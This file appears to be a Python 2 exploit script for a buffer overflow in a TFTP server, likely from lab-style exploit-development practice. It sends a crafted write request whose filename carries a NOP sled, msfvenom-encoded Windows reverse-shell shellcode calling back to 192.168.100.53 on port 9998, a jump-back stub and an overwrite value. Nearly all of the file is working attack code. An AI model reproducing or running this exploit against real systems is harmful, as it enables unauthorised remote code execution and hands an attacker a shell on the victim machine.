#!/usr/bin/python
import socket
import sys

host = '192.168.100.146'
port = 69

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
except:
    print "socket() failed"
    sys.exit(1)

#17 bytes - jumps back 512 bytes into buffer
jmpback="\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1"

#filename = "\x41" * 1524 + "\x42\x42\x42\x42" + "\x43" * 3472
#filename = "\x41" * 1420 + "\x90" * 83 + jmpback + "\xeb\xd0\x90\x90" + "\x4F\x48\x40"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.53 LPORT=9998 -b "\x00\x2f" -e x86/shikata_ga_nai exitfunc=seh -f python -v shell
#Payload size: 352 bytes
shell =  ""
shell += "\x90\xbf\xf9\xb7\xfc\xea\xda\xd1\xd9\x74\x24\xf4\x5a\x31"
shell += "\xc9\xb1\x52\x83\xea\xfc\x31\x7a\x0e\x03\x83\xb9\x1e"
shell += "\x1f\x8f\x2e\x5c\xe0\x6f\xaf\x01\x68\x8a\x9e\x01\x0e"
shell += "\xdf\xb1\xb1\x44\x8d\x3d\x39\x08\x25\xb5\x4f\x85\x4a"
shell += "\x7e\xe5\xf3\x65\x7f\x56\xc7\xe4\x03\xa5\x14\xc6\x3a"
shell += "\x66\x69\x07\x7a\x9b\x80\x55\xd3\xd7\x37\x49\x50\xad"
shell += "\x8b\xe2\x2a\x23\x8c\x17\xfa\x42\xbd\x86\x70\x1d\x1d"
shell += "\x29\x54\x15\x14\x31\xb9\x10\xee\xca\x09\xee\xf1\x1a"
shell += "\x40\x0f\x5d\x63\x6c\xe2\x9f\xa4\x4b\x1d\xea\xdc\xaf"
shell += "\xa0\xed\x1b\xcd\x7e\x7b\xbf\x75\xf4\xdb\x1b\x87\xd9"
shell += "\xba\xe8\x8b\x96\xc9\xb6\x8f\x29\x1d\xcd\xb4\xa2\xa0"
shell += "\x01\x3d\xf0\x86\x85\x65\xa2\xa7\x9c\xc3\x05\xd7\xfe"
shell += "\xab\xfa\x7d\x75\x41\xee\x0f\xd4\x0e\xc3\x3d\xe6\xce"
shell += "\x4b\x35\x95\xfc\xd4\xed\x31\x4d\x9c\x2b\xc6\xb2\xb7"
shell += "\x8c\x58\x4d\x38\xed\x71\x8a\x6c\xbd\xe9\x3b\x0d\x56"
shell += "\xe9\xc4\xd8\xf9\xb9\x6a\xb3\xb9\x69\xcb\x63\x52\x63"
shell += "\xc4\x5c\x42\x8c\x0e\xf5\xe9\x77\xd9\x3a\x45\x13\x2c"
shell += "\xd3\x94\xdb\x69\x2d\x10\x3d\x1f\x21\x74\x96\x88\xd8"
shell += "\xdd\x6c\x28\x24\xc8\x09\x6a\xae\xff\xee\x25\x47\x75"
shell += "\xfc\xd2\xa7\xc0\x5e\x74\xb7\xfe\xf6\x1a\x2a\x65\x06"
shell += "\x54\x57\x32\x51\x31\xa9\x4b\x37\xaf\x90\xe5\x25\x32"
shell += "\x44\xcd\xed\xe9\xb5\xd0\xec\x7c\x81\xf6\xfe\xb8\x0a"
shell += "\xb3\xaa\x14\x5d\x6d\x04\xd3\x37\xdf\xfe\x8d\xe4\x89"
shell += "\x96\x48\xc7\x09\xe0\x54\x02\xfc\x0c\xe4\xfb\xb9\x33"
shell += "\xc9\x6b\x4e\x4c\x37\x0c\xb1\x87\xf3\x32\x43\x15\xee"
shell += "\xa3\xfa\xcc\x53\xae\xfc\x3b\x97\xd7\x7e\xc9\x68\x2c"
shell += "\x9e\xb8\x6d\x68\x18\x51\x1c\xe1\xcd\x55\xb3\x02\xc4"

filename = "\x90" *1053 + shell + "\x90" * (440-len(shell)) + "\x90" * 10 + jmpback + "\xeb\xd0\x90\x90" + "\x4F\x48\x40"

mode = "netascii"

evil = "\x00\x02" + filename + "\x00" + mode + "\x00"

s.sendto(evil, (host,port))
